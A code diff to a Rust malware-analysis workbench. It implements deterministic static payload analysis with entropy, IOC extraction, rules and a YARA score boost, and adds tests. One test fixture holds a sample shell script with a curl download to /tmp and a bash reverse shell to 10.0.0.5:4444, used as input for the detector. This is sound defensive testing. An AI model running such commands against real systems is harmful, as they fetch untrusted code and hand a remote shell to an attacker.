@@ -18,10 +18,21 @@
 //! so the check-then-create race the flock guards against in the
 //! multi-replica Go monolith doesn't apply here today; revisit if this
 //! service is ever scaled beyond one replica.
-//! "deterministic" analyzer submissions report a clear "not implemented in
-//! this tier yet" failure rather than a real result — full deterministic
-//! payload analysis (YARA, entropy, IOC extraction) has no Rust
-//! equivalent yet.
+//!
+//! "deterministic" analyzer submissions run real, synchronous static
+//! analysis (payload_static_analysis::analyze — Shannon entropy, IOC
+//! extraction, and a small heuristic rule set) and complete immediately,
+//! same as Go's submitWorkbenchChild does by calling analyzePayload inline
+//! rather than spooling a request marker. Any pre-scanned YARA matches
+//! (yara-analysis-v1, populated out of band by the networkless
+//! analysis/yara/scanner.py service — see payload_static_analysis's module
+//! doc comment) are folded in only on the initial submission path
+//! (create_run), which is already async and has an AppState to query ES
+//! with; the "retry" action runs through workbench_es::update_run's
+//! inherently synchronous CAS-retry closure, which cannot await an ES
+//! call, so a retried deterministic child recomputes without the YARA
+//! boost — a narrower version of the same gap this file already documents
+//! for ghidra/revdeck's trueSHA256 above.
 
 use serde_json::{json, Value};
 use std::path::Path;
@@ -31,6 +42,34 @@ use crate::payload_paths::{read_payload_head, resolve_payload_path};
 use crate::sandbox_submit::{create_request_marker, sandbox_request_dir};
 use crate::workbench_domain::{self, WorkbenchChild, WorkbenchRun, WorkbenchSelection};
 use crate::AppState;
+
+/// Fetches any pre-scanned YARA matches for `hash` out of yara-analysis-v1
+/// — the same index payload_detail.rs and worker.rs already read, itself
+/// populated by es-results-importer's "yara" source
+/// (YARA_RESULTS_DIR/results.json), never computed in this crate. Uses a
+/// `match` query rather than `term` on `yara.sha256`: worker.rs's own read
+/// of this index avoids an exact-term filter on a hash field too (it scans
+/// the 200 most recent hits and compares client-side), suggesting the
+/// field's ES mapping isn't reliably `keyword`-typed; `match` degrades
+/// gracefully either way. Best-effort: any ES error is treated as "no
+/// matches yet" rather than failing the whole deterministic submission.
+async fn fetch_yara_matches(es: &crate::es::Es, hash: &str) -> Vec<String> {
+    let Ok(result) = es
+        .search_index(
+            &["yara-analysis-v1"],
+            json!({"size": 1, "query": {"match": {"yara.sha256": hash}}}),
+        )
+        .await
+    else {
+        return Vec::new();
+    };
+    result["hits"]["hits"]
+        .as_array()
+        .and_then(|hits| hits.first())
+        .and_then(|hit| hit["_source"]["yara"]["matches"].as_array())
+        .map(|matches| matches.iter().filter_map(|m| m.as_str().map(str::to_string)).collect())
+        .unwrap_or_default()
+}
 
 fn env_dir(name: &str) -> String {
     std::env::var(name).unwrap_or_default()
@@ -286,12 +325,29 @@ fn submit_child(
     hash: &str,
     classification: &PayloadClassification,
     child: &mut WorkbenchChild,
+    yara_matches: &[String],
 ) -> Result<(), String> {
     let now = chrono::Utc::now().to_rfc3339();
     child.updated_at = now;
     match child.analyzer_id.as_str() {
         "deterministic" => {
-            Err("deterministic analysis is not yet implemented in this tier".to_string())
+            let path = resolve_payload_path(hash).map_err(|_| "deterministic analysis failed".to_string())?;
+            let (data, real_size) = crate::payload_static_analysis::read_bounded(&path)
+                .map_err(|_| "deterministic analysis failed".to_string())?;
+            let result =
+                crate::payload_static_analysis::analyze(&data, real_size, yara_matches.to_vec());
+            child.state = "completed".into();
+            child.result_url = format!("/payload-analysis/{hash}");
+            child.summary = format!(
+                "risk {}/100 ({}); {} IOC(s); {} rule match(es)",
+                result.risk_score,
+                result.risk_level,
+                result.iocs.len(),
+                result.rules.len()
+            );
+            child.retryable = false;
+            child.cancelable = false;
+            Ok(())
         }
         "ghidra" => {
             create_marker(&ghidra_request_dir(), hash)
@@ -443,6 +499,14 @@ pub async fn create_run(
 
     let now = chrono::Utc::now().to_rfc3339();
     let registry = workbench_domain::registry(&classification);
+    // Fetched once, up front, only when a "deterministic" child is
+    // actually selected — see fetch_yara_matches's own doc comment for why
+    // this has to happen here rather than inside submit_child.
+    let yara_matches = if selections.iter().any(|s| s.analyzer_id == "deterministic") {
+        fetch_yara_matches(&state.es, &hash).await
+    } else {
+        Vec::new()
+    };
     let mut children = Vec::with_capacity(selections.len());
     for selection in &selections {
         let analyzer = workbench_domain::analyzer_by_id(&registry, &selection.analyzer_id);
@@ -474,7 +538,7 @@ pub async fn create_run(
                 child.reason = a.reason.clone();
             }
             _ => {
-                if let Err(error) = submit_child(&hash, &classification, &mut child) {
+                if let Err(error) = submit_child(&hash, &classification, &mut child, &yara_matches) {
                     child.state = "failed".into();
                     child.reason = error;
                     child.retryable = child.attempts <= child.options.retry_limit;
@@ -864,7 +928,9 @@ pub async fn child_action(
                 }
                 let hash = run.payload_sha256.clone();
                 let child = &mut run.children[index];
-                if let Err(error) = submit_child(&hash, &classification, child) {
+                // No YARA fetch on retry — see this file's module doc
+                // comment and fetch_yara_matches' own comment for why.
+                if let Err(error) = submit_child(&hash, &classification, child, &[]) {
                     child.state = "failed".into();
                     child.reason = error;
                     child.retryable = child.attempts <= child.options.retry_limit;
@@ -876,4 +942,124 @@ pub async fn child_action(
         Ok(true)
     })
     .await
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::workbench_domain::WorkbenchChild;
+    use std::sync::Mutex;
+
+    // PAYLOAD_DIRS is process-global; no other test in this crate reads it
+    // (confirmed by grep before adding this), but serialize this module's
+    // own tests against each other in case more are added later.
+    static PAYLOAD_DIRS_LOCK: Mutex<()> = Mutex::new(());
+
+    fn new_deterministic_child() -> WorkbenchChild {
+        let now = chrono::Utc::now().to_rfc3339();
+        WorkbenchChild {
+            analyzer_id: "deterministic".into(),
+            display_name: "Deterministic local analysis".into(),
+            state: "queued".into(),
+            created_at: now.clone(),
+            updated_at: now.clone(),
+            deadline: now.clone(),
+            queue_deadline: now,
+            attempts: 1,
+            ..Default::default()
+        }
+    }
+
+    /// Mirrors dashboard/workbench_test.go's
+    /// TestWorkbenchDeterministicRunAndIdempotency: submits a payload with
+    /// real reverse-shell/downloader content (plus a synthetic pre-scanned
+    /// YARA match, standing in for a real analysis/yara/scanner.py hit)
+    /// through the "deterministic" analyzer dispatch and asserts a
+    /// completed state carrying real entropy/IOC/rule/YARA-informed risk
+    /// data — the regression this fix closes always returned
+    /// Err("deterministic analysis is not yet implemented in this tier")
+    /// here instead.
+    #[test]
+    fn deterministic_analyzer_completes_with_real_entropy_ioc_and_yara_data() {
+        let _guard = PAYLOAD_DIRS_LOCK.lock().unwrap();
+
+        let dir = std::env::temp_dir().join(format!(
+            "wb-deterministic-test-{}-{:?}",
+            std::process::id(),
+            std::thread::current().id()
+        ));
+        std::fs::create_dir_all(&dir).unwrap();
+        let hash = "a".repeat(64);
+        let sample = b"#!/bin/sh\n\
+            curl http://example.invalid/x -o /tmp/x\n\
+            bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n";
+        std::fs::write(dir.join(&hash), sample).unwrap();
+        // SAFETY: serialized by PAYLOAD_DIRS_LOCK above; no other test in
+        // this crate reads PAYLOAD_DIRS.
+        unsafe {
+            std::env::set_var("PAYLOAD_DIRS", dir.to_str().unwrap());
+        }
+
+        let classification = classify_payload(sample);
+        let mut child = new_deterministic_child();
+        let yara_matches = vec!["Suspected_Reverse_Shell".to_string()];
+        let result = submit_child(&hash, &classification, &mut child, &yara_matches);
+
+        unsafe {
+            std::env::remove_var("PAYLOAD_DIRS");
+        }
+        std::fs::remove_dir_all(&dir).ok();
+
+        assert!(result.is_ok(), "expected a completed result, got {result:?}");
+        assert_eq!(child.state, "completed");
+        assert_eq!(child.result_url, format!("/payload-analysis/{hash}"));
+        assert!(!child.retryable);
+        assert!(!child.cancelable);
+        // Real IOC extraction (the URL and the IP literal in the sample)
+        // and real rule matches (network_downloader, reverse_shell_pattern)
+        // must both be non-zero, and the YARA match must have pushed the
+        // score to the higher (40-point) boost tier.
+        assert!(
+            child.summary.contains("2 IOC(s)") || child.summary.contains("3 IOC(s)"),
+            "summary did not report real IOC data: {}",
+            child.summary
+        );
+        assert!(
+            child.summary.contains("2 rule match(es)"),
+            "summary did not report real rule-match data: {}",
+            child.summary
+        );
+        assert!(
+            child.summary.starts_with("risk 100/100 (critical)"),
+            "summary did not reflect the YARA-boosted risk score: {}",
+            child.summary
+        );
+    }
+
+    #[test]
+    fn deterministic_analyzer_fails_cleanly_for_a_missing_payload() {
+        let _guard = PAYLOAD_DIRS_LOCK.lock().unwrap();
+        let dir = std::env::temp_dir().join(format!(
+            "wb-deterministic-missing-{}-{:?}",
+            std::process::id(),
+            std::thread::current().id()
+        ));
+        std::fs::create_dir_all(&dir).unwrap();
+        // SAFETY: serialized by PAYLOAD_DIRS_LOCK above.
+        unsafe {
+            std::env::set_var("PAYLOAD_DIRS", dir.to_str().unwrap());
+        }
+
+        let hash = "b".repeat(64);
+        let classification = classify_payload(b"");
+        let mut child = new_deterministic_child();
+        let result = submit_child(&hash, &classification, &mut child, &[]);
+
+        unsafe {
+            std::env::remove_var("PAYLOAD_DIRS");
+        }
+        std::fs::remove_dir_all(&dir).ok();
+
+        assert_eq!(result, Err("deterministic analysis failed".to_string()));
+    }
 }
